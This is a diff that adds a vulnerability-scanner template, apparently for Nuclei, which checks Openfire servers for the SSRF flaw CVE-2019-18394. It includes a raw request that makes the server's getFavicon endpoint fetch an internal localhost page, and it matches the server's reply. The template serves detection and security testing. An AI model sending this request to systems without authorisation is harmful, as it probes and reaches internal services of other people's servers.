@@ -1,0 +1,28 @@
+id: openfire-ssrf-cve-2019-18394
+
+info:
+  name: Openfire SSRF (CVE-2019-18394)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A Server Side Request Forgery (SSRF) vulnerability in FaviconServlet.java in Ignite Realtime Openfire through 4.4.2 allows attackers to send arbitrary HTTP GET requests.
+  tags: ssrf
+
+variables:
+  target_host: "127.0.0.1:9090/index.jsp?"
+
+http:
+  - raw:
+      - |
+        GET /getFavicon?host={{target_host}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '<meta http-equiv="refresh" content="0;URL=index.jsp">'
+        part: body
